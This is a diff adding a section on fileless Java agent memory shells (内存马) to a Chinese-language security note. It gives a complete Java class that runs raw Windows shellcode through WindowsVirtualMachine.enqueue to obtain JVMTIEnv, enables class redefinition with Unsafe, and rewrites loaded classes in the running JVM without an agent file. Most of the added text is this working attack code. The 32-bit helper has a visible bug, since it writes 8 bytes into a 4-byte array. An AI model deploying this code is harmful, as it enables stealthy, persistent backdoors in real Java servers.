@@ -429,6 +429,128 @@ agent内存马分为有文件落地和无文件落地两种方式，无文件落
     }
    ```
 
+### 无文件实现
+
+> jvm.dll -> JNI_GetCreatedJavaVMs -> JavaVM -> GetEnv -> JVMTIEnv -> JPLISAgent
+
+1. agent本质上是构建一个InstrumentationImpl对象，然后调用它的retransformClasses方法进行已加载类字节码的修改
+2. InstrumentationImpl的构造方法需要传入一个JPLISAgent结构体的指针参数
+3. JPLISAgent结构体有一个mNormalEnviroment结构体指针，指向JVMTIEnv地址，redefineClasses方法就是依靠JVMTIEnv调用，
+4. 还有一个mRedefineAvailable成员，用于决定是否允许redefineClasses方法修改字节码，这个在Java层可以通过反射修改mEnvironmentSupportsRetransformClassesKnown和mEnvironmentSupportsRetransformClasses为true
+5. 要获取JVMTIEnv的地址，可以通过JavaVM结构体的GetEnv成员函数得到
+6. JavaVM结构体的地址可以通过jvm.dll的JNI_GetCreatedJavaVMs成员函数得到
+7. jvm.dll的地址可以通过kernel32.dll的LoadLibraryA函数得到
+8. LoadLibraryA地址可以通过kernel32.dll的GetProcessAddress获取
+9. GetProcessAddress地址可以通过遍历kernel32.dll的导出表获取
+10. kerne32.dll地址可以通过遍历PEB结构体的双向链表得到
+
+通过以上的步骤，就无需通过agent技术即可实现动态修改类字节码,但是问题来了，这个方式只能修改当前Java进程的字节码，无法注入到其他Java进程，如果希望修改其他Java进程加载类的字节码，还是得通过agent技术
+
+```java
+import sun.instrument.InstrumentationImpl;
+import sun.misc.Unsafe;
+import java.lang.instrument.ClassDefinition;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.lang.reflect.Method;
+
+public class NoFileAgent {
+
+    private InstrumentationImpl inst;
+    private Unsafe unsafe;
+    private int bitNumber;
+
+    public NoFileAgent() {
+        this.bitNumber = Integer.parseInt(System.getProperties().getProperty("sun.arch.data.model")) == 64 ? 64 : 32;
+        this.unsafe = getUnsafe();
+        this.inst = getInstrumentationImpl();
+    }
+    public void inject(String className, byte[] classBody) throws Exception {
+        if(this.inst == null){
+            return;
+        }
+        ClassDefinition definition = new ClassDefinition(Class.forName(className), classBody);
+        Method redefineClazz = InstrumentationImpl.class.getMethod("redefineClasses", ClassDefinition[].class);
+        redefineClazz.invoke(this.inst, new Object[]{new ClassDefinition[]{definition}});
+    }
+    private InstrumentationImpl getInstrumentationImpl(){
+        try {
+            Class<?> instClazz = Class.forName("sun.instrument.InstrumentationImpl");
+            Constructor<?> constructor = instClazz.getDeclaredConstructor(long.class, boolean.class, boolean.class);
+            constructor.setAccessible(true);
+            return (InstrumentationImpl)constructor.newInstance(getJPLISAgentPointer(), true, false);
+        }catch (Exception e){
+            return null;
+        }
+    }
+    private long getJPLISAgentPointer() throws Exception {
+        /*
+            struct _JPLISEnvironment {
+                jvmtiEnv *              mJVMTIEnv;              //the JVM TI environment
+                JPLISAgent *            mAgent;                 //corresponding agent
+                jboolean                mIsRetransformer;       //indicates if special environment
+                };
+            typedef struct _JPLISEnvironment  JPLISEnvironment;
+
+            struct _JPLISAgent {
+                JavaVM *                mJVM;                   // JVM指针，但RedefineClasses()没有用到，可以忽略，全填充0即可
+                JPLISEnvironment        mNormalEnvironment;     // _JPLISEnvironment结构体
+                ..... //无关紧要的成员
+                };
+            typedef struct _JPLISAgent        JPLISAgent;
+            #define jvmti(a) a->mNormalEnvironment.mJVMTIEnv    //实际功能就是取_JPLISAgent.mNormalEnvironment。类型是_JPLISEnvironment
+        */
+        long JPLISAgent = this.unsafe.allocateMemory(0x1000); //申请内存用于存储JPLISAgent结构体
+        //shellCode用于获取JVMTIEnv结构体
+        if(this.bitNumber == 64){
+            int pointerLength = 8;
+            byte[] shellCode = new byte[]{(byte) 0x48, (byte) 0x83, (byte) 0xEC, (byte) 0x28, (byte) 0x48, (byte) 0x83, (byte) 0xE4, (byte) 0xF0, (byte) 0x48, (byte) 0x31, (byte) 0xC9, (byte) 0x65, (byte) 0x48, (byte) 0x8B, (byte) 0x41, (byte) 0x60, (byte) 0x48, (byte) 0x8B, (byte) 0x40, (byte) 0x18, (byte) 0x48, (byte) 0x8B, (byte) 0x70, (byte) 0x20, (byte) 0x48, (byte) 0xAD, (byte) 0x48, (byte) 0x96, (byte) 0x48, (byte) 0xAD, (byte) 0x48, (byte) 0x8B, (byte) 0x58, (byte) 0x20, (byte) 0x4D, (byte) 0x31, (byte) 0xC0, (byte) 0x44, (byte) 0x8B, (byte) 0x43, (byte) 0x3C, (byte) 0x4C, (byte) 0x89, (byte) 0xC2, (byte) 0x48, (byte) 0x01, (byte) 0xDA, (byte) 0x44, (byte) 0x8B, (byte) 0x82, (byte) 0x88, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x49, (byte) 0x01, (byte) 0xD8, (byte) 0x48, (byte) 0x31, (byte) 0xF6, (byte) 0x41, (byte) 0x8B, (byte) 0x70, (byte) 0x20, (byte) 0x48, (byte) 0x01, (byte) 0xDE, (byte) 0x48, (byte) 0x31, (byte) 0xC9, (byte) 0x49, (byte) 0xB9, (byte) 0x47, (byte) 0x65, (byte) 0x74, (byte) 0x50, (byte) 0x72, (byte) 0x6F, (byte) 0x63, (byte) 0x41, (byte) 0x48, (byte) 0xFF, (byte) 0xC1, (byte) 0x48, (byte) 0x31, (byte) 0xC0, (byte) 0x8B, (byte) 0x04, (byte) 0x8E, (byte) 0x48, (byte) 0x01, (byte) 0xD8, (byte) 0x4C, (byte) 0x39, (byte) 0x08, (byte) 0x75, (byte) 0xEF, (byte) 0x48, (byte) 0x31, (byte) 0xF6, (byte) 0x41, (byte) 0x8B, (byte) 0x70, (byte) 0x24, (byte) 0x48, (byte) 0x01, (byte) 0xDE, (byte) 0x66, (byte) 0x8B, (byte) 0x0C, (byte) 0x4E, (byte) 0x48, (byte) 0x31, (byte) 0xF6, (byte) 0x41, (byte) 0x8B, (byte) 0x70, (byte) 0x1C, (byte) 0x48, (byte) 0x01, (byte) 0xDE, (byte) 0x48, (byte) 0x31, (byte) 0xD2, (byte) 0x8B, (byte) 0x14, (byte) 0x8E, (byte) 0x48, (byte) 0x01, (byte) 0xDA, (byte) 0x48, (byte) 0x89, (byte) 0xD7, (byte) 0xB9, (byte) 0x61, (byte) 0x72, (byte) 0x79, (byte) 0x41, (byte) 0x51, (byte) 0x48, (byte) 0xB9, (byte) 0x4C, (byte) 0x6F, (byte) 0x61, (byte) 0x64, (byte) 0x4C, (byte) 0x69, (byte) 0x62, (byte) 0x72, (byte) 0x51, (byte) 0x48, (byte) 0x89, (byte) 0xE2, (byte) 0x48, (byte) 0x89, (byte) 0xD9, (byte) 0x48, (byte) 0x83, (byte) 0xEC, (byte) 0x30, (byte) 0xFF, (byte) 0xD7, (byte) 0x48, (byte) 0x83, (byte) 0xC4, (byte) 0x30, (byte) 0x48, (byte) 0x83, (byte) 0xC4, (byte) 0x10, (byte) 0x48, (byte) 0x89, (byte) 0xC6, (byte) 0xB9, (byte) 0x6C, (byte) 0x6C, (byte) 0x00, (byte) 0x00, (byte) 0x51, (byte) 0xB9, (byte) 0x6A, (byte) 0x76, (byte) 0x6D, (byte) 0x00, (byte) 0x51, (byte) 0x48, (byte) 0x89, (byte) 0xE1, (byte) 0x48, (byte) 0x83, (byte) 0xEC, (byte) 0x30, (byte) 0xFF, (byte) 0xD6, (byte) 0x48, (byte) 0x83, (byte) 0xC4, (byte) 0x30, (byte) 0x48, (byte) 0x83, (byte) 0xC4, (byte) 0x10, (byte) 0x49, (byte) 0x89, (byte) 0xC7, (byte) 0x48, (byte) 0x31, (byte) 0xC9, (byte) 0x48, (byte) 0xB9, (byte) 0x76, (byte) 0x61, (byte) 0x56, (byte) 0x4D, (byte) 0x73, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x51, (byte) 0x48, (byte) 0xB9, (byte) 0x72, (byte) 0x65, (byte) 0x61, (byte) 0x74, (byte) 0x65, (byte) 0x64, (byte) 0x4A, (byte) 0x61, (byte) 0x51, (byte) 0x48, (byte) 0xB9, (byte) 0x4A, (byte) 0x4E, (byte) 0x49, (byte) 0x5F, (byte) 0x47, (byte) 0x65, (byte) 0x74, (byte) 0x43, (byte) 0x51, (byte) 0x48, (byte) 0x89, (byte) 0xE2, (byte) 0x4C, (byte) 0x89, (byte) 0xF9, (byte) 0x48, (byte) 0x83, (byte) 0xEC, (byte) 0x28, (byte) 0xFF, (byte) 0xD7, (byte) 0x48, (byte) 0x83, (byte) 0xC4, (byte) 0x28, (byte) 0x48, (byte) 0x83, (byte) 0xC4, (byte) 0x18, (byte) 0x49, (byte) 0x89, (byte) 0xC7, (byte) 0x48, (byte) 0x83, (byte) 0xEC, (byte) 0x28, (byte) 0x48, (byte) 0x89, (byte) 0xE1, (byte) 0xBA, (byte) 0x01, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x49, (byte) 0x89, (byte) 0xC8, (byte) 0x49, (byte) 0x83, (byte) 0xC0, (byte) 0x08, (byte) 0x48, (byte) 0x83, (byte) 0xEC, (byte) 0x28, (byte) 0x41, (byte) 0xFF, (byte) 0xD7, (byte) 0x48, (byte) 0x83, (byte) 0xC4, (byte) 0x28, (byte) 0x48, (byte) 0x8B, (byte) 0x09, (byte) 0x48, (byte) 0x83, (byte) 0xEC, (byte) 0x20, (byte) 0x54, (byte) 0x48, (byte) 0x89, (byte) 0xE2, (byte) 0x4D, (byte) 0x31, (byte) 0xC0, (byte) 0x4C, (byte) 0x8B, (byte) 0x39, (byte) 0x4D, (byte) 0x8B, (byte) 0x7F, (byte) 0x20, (byte) 0x49, (byte) 0x89, (byte) 0xCE, (byte) 0x41, (byte) 0xFF, (byte) 0xD7, (byte) 0x4C, (byte) 0x89, (byte) 0xF1, (byte) 0x48, (byte) 0xBA, (byte) 0x48, (byte) 0x47, (byte) 0x46, (byte) 0x45, (byte) 0x44, (byte) 0x43, (byte) 0x42, (byte) 0x41, (byte) 0x41, (byte) 0xB8, (byte) 0x00, (byte) 0x02, (byte) 0x01, (byte) 0x30, (byte) 0x4D, (byte) 0x8B, (byte) 0x3E, (byte) 0x4D, (byte) 0x8B, (byte) 0x7F, (byte) 0x30, (byte) 0x48, (byte) 0x83, (byte) 0xEC, (byte) 0x20, (byte) 0x41, (byte) 0xFF, (byte) 0xD7, (byte) 0x48, (byte) 0x83, (byte) 0xC4, (byte) 0x20, (byte) 0x4C, (byte) 0x89, (byte) 0xF1, (byte) 0x4D, (byte) 0x8B, (byte) 0x3E, (byte) 0x4D, (byte) 0x8B, (byte) 0x7F, (byte) 0x28, (byte) 0x41, (byte) 0xFF, (byte) 0xD7, (byte) 0x48, (byte) 0x83, (byte) 0xC4, (byte) 0x78, (byte) 0xC3};
+            byte[] stub = longToLittleEndianBytes(JPLISAgent + pointerLength,pointerLength); //将JVMTIEnv的地址转为小端字节序列
+            System.arraycopy(stub, 0, shellCode, shellCode.length - 50, stub.length); //替换shellcode中用于接收JVMTIEnv结构体的地址
+            runShellCode(shellCode); //执行shellCode，获取JPLISAgent结构体
+            long jvmtiEnv = this.unsafe.getLong(JPLISAgent + pointerLength); //读取JPLISAgent结构体中的jvmtiEnv结构体的地址
+            this.unsafe.putByte(jvmtiEnv + 361, (byte) 2); //修正jvmtiEnv结构体can_redefine_classes成员为2，相当于开启Can-Redefine-Classes，不同JDK版本偏移量不一样
+            return JPLISAgent;
+        }
+        else{
+            int pointerLength = 4;
+            byte[] shellCode = new byte[]{(byte) 0x90, (byte) 0x90, (byte) 0x90, (byte) 0x33, (byte) 0xC9, (byte) 0x64, (byte) 0xA1, (byte) 0x30, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x8B, (byte) 0x40, (byte) 0x0C, (byte) 0x8B, (byte) 0x70, (byte) 0x14, (byte) 0xAD, (byte) 0x96, (byte) 0xAD, (byte) 0x8B, (byte) 0x58, (byte) 0x10, (byte) 0x8B, (byte) 0x53, (byte) 0x3C, (byte) 0x03, (byte) 0xD3, (byte) 0x8B, (byte) 0x52, (byte) 0x78, (byte) 0x03, (byte) 0xD3, (byte) 0x33, (byte) 0xC9, (byte) 0x8B, (byte) 0x72, (byte) 0x20, (byte) 0x03, (byte) 0xF3, (byte) 0x41, (byte) 0xAD, (byte) 0x03, (byte) 0xC3, (byte) 0x81, (byte) 0x38, (byte) 0x47, (byte) 0x65, (byte) 0x74, (byte) 0x50, (byte) 0x75, (byte) 0xF4, (byte) 0x81, (byte) 0x78, (byte) 0x04, (byte) 0x72, (byte) 0x6F, (byte) 0x63, (byte) 0x41, (byte) 0x75, (byte) 0xEB, (byte) 0x81, (byte) 0x78, (byte) 0x08, (byte) 0x64, (byte) 0x64, (byte) 0x72, (byte) 0x65, (byte) 0x75, (byte) 0xE2, (byte) 0x8B, (byte) 0x72, (byte) 0x24, (byte) 0x03, (byte) 0xF3, (byte) 0x66, (byte) 0x8B, (byte) 0x0C, (byte) 0x4E, (byte) 0x49, (byte) 0x8B, (byte) 0x72, (byte) 0x1C, (byte) 0x03, (byte) 0xF3, (byte) 0x8B, (byte) 0x14, (byte) 0x8E, (byte) 0x03, (byte) 0xD3, (byte) 0x52, (byte) 0x33, (byte) 0xC9, (byte) 0x51, (byte) 0x68, (byte) 0x61, (byte) 0x72, (byte) 0x79, (byte) 0x41, (byte) 0x68, (byte) 0x4C, (byte) 0x69, (byte) 0x62, (byte) 0x72, (byte) 0x68, (byte) 0x4C, (byte) 0x6F, (byte) 0x61, (byte) 0x64, (byte) 0x54, (byte) 0x53, (byte) 0xFF, (byte) 0xD2, (byte) 0x83, (byte) 0xC4, (byte) 0x0C, (byte) 0x59, (byte) 0x50, (byte) 0x66, (byte) 0xB9, (byte) 0x33, (byte) 0x32, (byte) 0x51, (byte) 0x68, (byte) 0x6A, (byte) 0x76, (byte) 0x6D, (byte) 0x00, (byte) 0x54, (byte) 0xFF, (byte) 0xD0, (byte) 0x8B, (byte) 0xD8, (byte) 0x83, (byte) 0xC4, (byte) 0x0C, (byte) 0x5A, (byte) 0x33, (byte) 0xC9, (byte) 0x51, (byte) 0x6A, (byte) 0x73, (byte) 0x68, (byte) 0x76, (byte) 0x61, (byte) 0x56, (byte) 0x4D, (byte) 0x68, (byte) 0x65, (byte) 0x64, (byte) 0x4A, (byte) 0x61, (byte) 0x68, (byte) 0x72, (byte) 0x65, (byte) 0x61, (byte) 0x74, (byte) 0x68, (byte) 0x47, (byte) 0x65, (byte) 0x74, (byte) 0x43, (byte) 0x68, (byte) 0x4A, (byte) 0x4E, (byte) 0x49, (byte) 0x5F, (byte) 0x54, (byte) 0x53, (byte) 0xFF, (byte) 0xD2, (byte) 0x89, (byte) 0x45, (byte) 0xF0, (byte) 0x54, (byte) 0x6A, (byte) 0x01, (byte) 0x54, (byte) 0x59, (byte) 0x83, (byte) 0xC1, (byte) 0x10, (byte) 0x51, (byte) 0x54, (byte) 0x59, (byte) 0x6A, (byte) 0x01, (byte) 0x51, (byte) 0xFF, (byte) 0xD0, (byte) 0x8B, (byte) 0xC1, (byte) 0x83, (byte) 0xEC, (byte) 0x30, (byte) 0x6A, (byte) 0x00, (byte) 0x54, (byte) 0x59, (byte) 0x83, (byte) 0xC1, (byte) 0x10, (byte) 0x51, (byte) 0x8B, (byte) 0x00, (byte) 0x50, (byte) 0x8B, (byte) 0x18, (byte) 0x8B, (byte) 0x43, (byte) 0x10, (byte) 0xFF, (byte) 0xD0, (byte) 0x8B, (byte) 0x43, (byte) 0x18, (byte) 0x68, (byte) 0x00, (byte) 0x02, (byte) 0x01, (byte) 0x30, (byte) 0x68, (byte) 0x44, (byte) 0x43, (byte) 0x42, (byte) 0x41, (byte) 0x83, (byte) 0xEC, (byte) 0x04, (byte) 0xFF, (byte) 0xD0, (byte) 0x83, (byte) 0xEC, (byte) 0x0C, (byte) 0x8B, (byte) 0x43, (byte) 0x14, (byte) 0xFF, (byte) 0xD0, (byte) 0x83, (byte) 0xC4, (byte) 0x5C, (byte) 0xC3};
+            byte[] stub = longToLittleEndianBytes(JPLISAgent + pointerLength,pointerLength);
+            System.arraycopy(stub, 0, shellCode, shellCode.length - 21, stub.length);
+            runShellCode(shellCode);
+            long jvmtiEnv = this.unsafe.getLong(JPLISAgent + pointerLength);
+            this.unsafe.putByte(jvmtiEnv + 201, (byte) 2);
+            return JPLISAgent;
+        }
+    }
+
+    private byte[] longToLittleEndianBytes(long value, int pointerLength) {
+        byte[] bytes = new byte[pointerLength];
+        for (int i = 0; i < 8; i++) {
+            bytes[i] = (byte) (value >>> (i * 8));
+        }
+        return bytes;
+    }
+
+    private void runShellCode(byte[] shellCode) throws Exception {
+        Class clazz = Class.forName("sun.tools.attach.WindowsVirtualMachine");
+        Method enqueue = clazz.getDeclaredMethod("enqueue", long.class, byte[].class, String.class, String.class, Object[].class);
+        enqueue.setAccessible(true);
+        enqueue.invoke(null, -1, shellCode, null, null, new Object[]{});
+    }
+
+    private Unsafe getUnsafe() {
+        try{
+        Field field = Class.forName("sun.misc.Unsafe").getDeclaredField("theUnsafe");
+        field.setAccessible(true);
+        return (Unsafe) field.get(null);
+        }catch(Exception e){
+            return null;
+        }
+    }
+}
+```
+
 ## 参考链接
 
 <https://www.cnblogs.com/silyvin/articles/12178528.html>  
